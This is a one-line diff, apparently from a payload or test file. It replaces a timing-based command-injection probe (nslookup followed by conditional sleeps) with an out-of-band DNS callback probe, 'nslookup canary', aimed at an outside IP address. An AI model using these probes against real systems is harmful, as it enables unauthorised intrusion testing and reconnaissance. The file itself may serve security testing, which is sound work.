@@ -1,1 +1,1 @@
-nslookup cdn.jsdelivr.net >/dev/null&&sleep 10||sleep 3
+nslookup canary 185.205.209.239
